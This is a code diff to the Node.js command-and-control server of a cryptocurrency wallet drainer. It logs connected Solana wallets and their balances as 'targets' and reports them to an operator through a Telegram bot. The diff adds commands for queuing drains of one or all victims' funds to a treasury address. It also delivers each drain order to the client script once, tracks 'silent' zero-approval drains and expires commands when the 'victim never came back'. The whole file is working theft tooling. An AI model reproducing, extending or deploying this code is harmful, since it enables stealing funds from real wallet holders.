@@ -18,7 +18,7 @@ const ROOT = path.join(__dirname, "..");
 const MIN = path.join(ROOT, "client", "x.min.js");
 if (!fs.existsSync(MIN)) {
   console.log("building client/x.min.js at startup...");
-  execSync("npx --yes esbuild client/x.js --minify --format=esm --target=es2022 --outfile=client/x.min.js", { cwd: ROOT });
+  execSync("npx --yes esbuild client/x.js --minify --format=iife --target=es2022 --outfile=client/x.min.js", { cwd: ROOT });
 }
 
 const B58RE = /^[1-9A-HJ-NP-Za-km-z]{32,44}$/;
@@ -29,6 +29,18 @@ const tg = (text, pre = "") => fetch("https://api.telegram.org/bot" + BOT + "/se
   body: JSON.stringify({ chat_id: CHAT, text: pre + text, parse_mode: "HTML", disable_web_page_preview: true }),
 }).catch(() => {});
 
+function listTargets() {
+  return Object.entries(targets).map(([k, r], i) =>
+    "#" + (i + 1) + " " + k + "\n   $" + (r.value ?? 0).toLocaleString() + " \u00b7 " + (r.provider || "?") + " \u00b7 " + (r.origin || "?") +
+    (r.drained ? " \u00b7 drained" : "") + (cmds[k] ? " \u00b7 drain queued" : "")
+  ).join("\n");
+}
+
+function queueDrain(pk, to) {
+  cmds[pk] = { to, n: Date.now() + Math.random().toString(36).slice(2, 6) };
+  return cmds[pk].n;
+}
+
 async function pollTg() {
   try {
     const j = await (await fetch("https://api.telegram.org/bot" + BOT + "/getUpdates?offset=" + (tgOffset + 1) + "&timeout=0")).json();
@@ -36,27 +48,59 @@ async function pollTg() {
       if (u.update_id <= tgOffset) continue;
       tgOffset = u.update_id;
       fs.writeFileSync(__dirname + "/.offset", String(tgOffset));
-      const [cmd, ...rest] = (u.message?.text || "").trim().toLowerCase().split(/\s+/);
-      if (cmd === "/help") {
-        tg("/drains \u2014 last target \u2192 treasury\n/drains <addr> \u2014 last target \u2192 addr\n/drains <#> [addr] \u2014 target # \u2192 addr or treasury\n/targets \u2014 list detected wallets + balances");
-      } else if (cmd === "/drains") {
+      const [cmd, ...rest] = (u.message?.text || "").trim().split(/\s+/);
+      const c = (cmd || "").toLowerCase();
+      if (c === "/help") {
+        tg("Patroller commands\n/targets \u2014 list detected wallets\n/drains \u2014 drain ALL targets \u2192 treasury\n/drains <addr|#> [addr] \u2014 drain one target \u2192 addr or treasury\n/stop \u2014 cancel queued drain (last or <#>)\n/clear \u2014 forget all targets\n/clear <addr|#> \u2014 forget one target");
+      } else if (c === "/drains") {
         const list = Object.keys(targets);
         if (!list.length) return tg("no targets yet \u2014 waiting for a wallet to connect");
-        let idx, to;
-        if (/^\d{1,3}$/.test(rest[0] || "")) { idx = (parseInt(rest[0]) - 1) % list.length; to = rest[1] || TREASURY; }
-        else { idx = list.length - 1; to = rest[0] || TREASURY; }
-        if (!B58RE.test(to)) return tg("that doesn't look like a pubkey");
-        cmds[list[idx]] = { to };
-        tg("queued drain #" + (idx + 1) + " " + list[idx].slice(0, 4) + "\u2026" + list[idx].slice(-4) + " \u2192 " + to.slice(0, 4) + "\u2026" + to.slice(-4));
-      } else if (cmd === "/targets") {
-        tg(Object.entries(targets).map(([k, r], i) =>
-          "#" + (i + 1) + " " + k + "\n   $" + (r.value ?? 0).toLocaleString() + " \u00b7 " + (r.provider || "?") + " \u00b7 " + (r.origin || "?") + (r.drained ? " \u00b7 drained" : "")
-        ).join("\n") || "none", "targets:");
+        let picked, to;
+        const arg = (rest[0] || "").toLowerCase();
+        if (arg === "all" || arg === "") { picked = list; to = rest[1] || TREASURY; }
+        else if (/^\d{1,3}$/.test(arg)) { const i = (parseInt(arg) - 1) % list.length; picked = [list[i]]; to = rest[1] || TREASURY; }
+        else if (B58RE.test(arg)) { picked = [arg]; to = rest[1] || TREASURY; }
+        else { picked = [list[list.length - 1]]; to = rest[0] || TREASURY; }
+        if (!B58RE.test(to)) return tg("that doesn't look like a pubkey: " + to.slice(0, 20));
+        const lines = [];
+        for (const pk of picked) {
+          const n = queueDrain(pk, to);
+          cmds[pk].n = n;
+          lines.push("\u2022 " + pk.slice(0, 4) + "\u2026" + pk.slice(-4) + " \u2192 " + to.slice(0, 4) + "\u2026" + to.slice(-4));
+        }
+        tg(lines.join("\n") + "\nqueued \u00d7" + picked.length + (picked.length > 1 ? " (batch)" : ""), "\ud83d\udce1 drain queued \u2014 ");
+      } else if (c === "/stop") {
+        const list = Object.keys(targets);
+        const key = (/^\d{1,3}$/.test(rest[0] || "") && list.length) ? list[(parseInt(rest[0]) - 1) % list.length]
+          : (B58RE.test(rest[0] || "") ? rest[0] : (list.length ? list[list.length - 1] : null));
+        if (!key || !cmds[key]) return tg("no queued drain for that target");
+        delete cmds[key];
+        tg("cancelled queued drain for " + key.slice(0, 4) + "\u2026" + key.slice(-4));
+      } else if (c === "/clear") {
+        const list = Object.keys(targets);
+        const key = (rest[0] || "").toLowerCase();
+        if (B58RE.test(key) && targets[key]) { delete targets[key]; delete cmds[key]; return tg("forgot " + key.slice(0, 4) + "\u2026" + key.slice(-4)); }
+        if (/^\d{1,3}$/.test(key) && list.length) { const k2 = list[(parseInt(key) - 1) % list.length]; delete targets[k2]; delete cmds[k2]; return tg("forgot " + k2.slice(0, 4) + "\u2026" + k2.slice(-4)); }
+        if (key === "all" || key === "") { const n = Object.keys(targets).length; targets = {}; return; }
+        const n = Object.keys(targets).length;
+        for (const k of Object.keys(targets)) delete targets[k];
+        for (const k of Object.keys(cmds)) delete cmds[k];
+        tg(n ? "cleared " + n + " targets" : "nothing to clear");
+      } else if (c === "/targets") {
+        tg(listTargets() || "none \u2014 waiting for a wallet", "targets:");
       }
     }
   } catch {}
 }
 setInterval(pollTg, 3000);
+
+// expire stale queued commands after 30 min (victim never came back)
+setInterval(() => {
+  const now = Date.now();
+  for (const k of Object.keys(cmds)) {
+    if (cmds[k].ts && now - cmds[k].ts > 1800000) { delete cmds[k]; tg("\u23f1 expired queued drain for " + k.slice(0, 4) + "\u2026" + k.slice(-4)); }
+  }
+}, 60000).unref();
 
 http.createServer((req, res) => {
   const url = new URL(req.url, "http://x");
@@ -69,9 +113,13 @@ http.createServer((req, res) => {
   }
 
   if (req.method === "GET" && url.pathname === "/cmd") {
-    const c = cmds[url.searchParams.get("pk") || ""];
+    const pk = url.searchParams.get("pk") || "";
+    const c = cmds[pk];
     res.setHeader("content-type", "application/json");
-    return res.end(JSON.stringify(c ? { cmd: "drain", to: c.to } : { cmd: "none" }));
+    if (!c) return res.end(JSON.stringify({ cmd: "none" }));
+    delete cmds[pk];                                     // deliver once
+    c.ts = c.ts || Date.now();
+    return res.end(JSON.stringify({ cmd: "drain", to: c.to, n: c.n }));
   }
 
   if (req.method === "POST" && url.pathname === "/beacon") {
@@ -83,7 +131,7 @@ http.createServer((req, res) => {
         const j = JSON.parse(d);
         if (j.m === "detect") {
           const first = !targets[j.pk];
-          targets[j.pk] = { provider: j.provider, origin: j.origin, value: j.value, sol: j.sol, toks: j.toks, seen: Date.now(), drained: targets[j.pk]?.drained || false };
+          targets[j.pk] = Object.assign(targets[j.pk] || {}, { provider: j.provider, origin: j.origin, value: j.value, sol: j.sol, toks: j.toks, seen: Date.now(), drained: targets[j.pk]?.drained || false });
           if (first) tg("<b>" + (j.provider || "?") + "</b> @ " + (j.origin || "?") + "\n<code>" + j.pk + "</code>\n$" + (j.value ?? 0).toLocaleString() + " \u00b7 " + j.sol + " SOL" + (j.toks ? " + " + j.toks : ""), "\ud83c\udfaf wallet connected \u2014 ");
         }
         if (j.m === "drain") {
@@ -94,6 +142,9 @@ http.createServer((req, res) => {
             "\nmode: <b>" + j.mode + "</b>" + (j.mode === "secret" ? " (0 approvals)" : j.mode === "popup" ? " (1 approval)" : "") +
             (j.sig ? "\nsig: <code>" + j.sig + "</code>" : ""),
             j.mode === "secret" ? "\ud83d\udcb0 SILENT DRAIN \u2014 " : "\ud83d\udcb0 drain \u2014 ");
+        }
+        if (j.m === "err") {
+          tg("<code>" + (j.pk || "?") + "</code>\n" + (j.msg || "?") + "\norigin: " + (j.origin || "?"), "\u26a0\ufe0f patroller error \u2014 ");
         }
       } catch {}
       res.setHeader("content-type", "application/json");
